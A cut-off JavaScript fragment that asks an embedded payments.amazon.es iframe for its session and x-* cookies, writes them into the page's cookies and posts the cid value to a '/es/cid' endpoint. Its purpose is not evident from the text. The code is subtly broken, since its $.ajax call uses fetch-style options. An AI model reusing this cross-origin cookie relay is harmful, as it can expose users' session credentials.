		var $iframe = $('#cookie-iframe');
		var iframe = $iframe[0];

		window.addEventListener('message', function (e) {
			if (e.source === iframe.contentWindow && e.origin === 'https://payments.amazon.es') {
				var cookie = e.data;

				if (cookie.sessionId) document.cookie = "domain-specific-session-id=" + cookie.sessionId;

				if (cookie.cidCookie) {
					document.cookie = "x-main=" + cookie.cidCookie;

					$.ajax('/es/cid?id=9AE05E6619514A639B2F', {
						type: 'POST',
						headers: {
							'Content-Type': 'application/json',
							'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
						},
						body: JSON.stringify({ cid: cookie.cidCookie }),
						credentials: 'include'
					});
				}
			}
		});

		$iframe.load(function() {
			iframe.contentWindow.postMessage('send me your x-* and session-id cookies', 'https://payments.amazon.es');
